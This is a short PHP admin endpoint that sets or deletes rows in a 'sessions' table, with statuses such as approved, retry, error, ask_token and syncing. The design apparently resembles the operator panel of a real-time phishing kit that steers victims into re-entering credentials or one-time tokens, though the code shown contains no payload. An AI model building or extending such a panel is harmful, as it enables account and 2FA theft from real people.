<?php
require_once __DIR__ . '/../core/db.php';
header('Content-Type: application/json');
session_start();

if (empty($_SESSION['sucv_admin_auth'])) {
    echo json_encode(['ok' => false, 'msg' => 'unauthorized']);
    exit;
}

$pdo = getDB();
$action = $_POST['action'] ?? '';
$sid    = $_POST['session_id'] ?? '';

function respond($ok, $msg = '') {
    echo json_encode(['ok' => $ok, 'msg' => $msg]);
    exit;
}

if ($action === 'delete_all') {
    $pdo->exec("DELETE FROM sessions");
    respond(true, 'All sessions deleted');
}

if (!$sid) {
    respond(false, 'Missing session_id');
}

switch ($action) {
    case 'error':
        $pdo->prepare("UPDATE sessions SET status = 'error' WHERE session_id = ?")->execute([$sid]);
        respond(true);
    case 'approved':
        $pdo->prepare("UPDATE sessions SET status = 'approved' WHERE session_id = ?")->execute([$sid]);
        respond(true);
    case 'retry':
        $pdo->prepare("UPDATE sessions SET status = 'retry' WHERE session_id = ?")->execute([$sid]);
        respond(true);
    case 'ask_token':
        $pdo->prepare("UPDATE sessions SET status = 'ask_token' WHERE session_id = ?")->execute([$sid]);
        respond(true);
    case 'syncing':
        $pdo->prepare("UPDATE sessions SET status = 'syncing' WHERE session_id = ?")->execute([$sid]);
        respond(true);
    case 'delete':
        $pdo->prepare("DELETE FROM sessions WHERE session_id = ?")->execute([$sid]);
        respond(true);
    default:
        respond(false, 'Unknown action');
}
?>
